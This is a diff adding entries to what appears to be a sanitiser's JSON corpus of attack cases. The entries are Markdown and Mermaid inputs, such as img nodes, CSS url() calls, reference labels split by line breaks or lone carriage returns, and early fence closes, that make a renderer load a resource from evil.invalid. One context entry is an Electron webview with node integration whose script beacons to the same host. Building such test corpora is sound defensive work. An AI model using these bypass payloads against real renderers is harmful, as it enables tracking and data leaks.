@@ -2490,5 +2490,60 @@
   "kind": "attack",
   "html": "<webview src=\"data:text/html,%3Cscript%3Enew%20Image().src%3D%27https%3A//evil.invalid/node-%27%2Btypeof%20require%3C/script%3E\" nodeintegration nodeintegrationinsubframes webpreferences=\"contextIsolation=no,nodeIntegration=yes\" style=\"width:50px;height:50px\"></webview>",
   "note": "review 2026-10-10 (round 2): [hand7] Kontrolle ohne Anfrage (kein echter Angriff in diesen Engines) | "
+ },
+ {
+  "name": "md fence Mermaid img (Mermaid >= 11.3, new Image())",
+  "kind": "attack",
+  "markdown": "```mermaid\ngraph TD\n  A@{ img: \"https://evil.invalid/x.png\", label: \"a\" }\n```",
+  "note": "Loads outside any DOM tree; only the regex layer sees it (0.20.0)."
+ },
+ {
+  "name": "md fence Mermaid img scheme without //",
+  "kind": "attack",
+  "markdown": "```mermaid\ngraph TD\n  A@{ img: \"http:evil.invalid/x.png\", label: \"a\" }\n```"
+ },
+ {
+  "name": "md fence Mermaid classDef url()",
+  "kind": "attack",
+  "markdown": "```mermaid\ngraph TD\n  A-->B\n  classDef f background:url(https://evil.invalid/x.png)\n  class A f\n```"
+ },
+ {
+  "name": "md fence Mermaid init themeCSS",
+  "kind": "attack",
+  "markdown": "```mermaid\n%%{init: {\"themeCSS\": \".node rect{fill:url(https://evil.invalid/x.png)}\"}}%%\ngraph TD\n  A-->B\n```"
+ },
+ {
+  "name": "md fence Mermaid html label img",
+  "kind": "attack",
+  "markdown": "```mermaid\ngraph TD\n  A[\"<img src='https://evil.invalid/x.png'>\"]\n```"
+ },
+ {
+  "name": "md fence Mermaid in callout",
+  "kind": "attack",
+  "markdown": "> [!note]\n> ```mermaid\n> graph TD\n>   A@{ img: \"https://evil.invalid/x.png\", label: \"a\" }\n> ```"
+ },
+ {
+  "name": "md fence Mermaid early close by indented fence",
+  "kind": "attack",
+  "markdown": "```mermaid\ngraph TD\n    ```\n  A@{ img: \"https://evil.invalid/x.png\", label: \"a\" }\n```",
+  "note": "Four spaces do not close the fence; the img line is still Mermaid source."
+ },
+ {
+  "name": "md reference label over a line break",
+  "kind": "attack",
+  "markdown": "![x][a b]\n\n[a\nb]: https://evil.invalid/x.png",
+  "note": "CommonMark labels may span lines; kept the image alive until 0.20.0."
+ },
+ {
+  "name": "md reference destination after a lone CR",
+  "kind": "attack",
+  "markdown": "![x][a]\r\r[a]:\rhttps://evil.invalid/x.png",
+  "note": "A lone \\r is a CommonMark line ending; kept the image alive until 0.20.0."
+ },
+ {
+  "name": "md fence Mermaid after a lone CR",
+  "kind": "attack",
+  "markdown": "# A\r\r```mermaid\rgraph TD\r  A@{ img: \"https://evil.invalid/x.png\", label: \"a\" }\r```",
+  "note": "Missed by a line scan that splits at \\n only (found by the markdown-it differential)."
  }
 ]
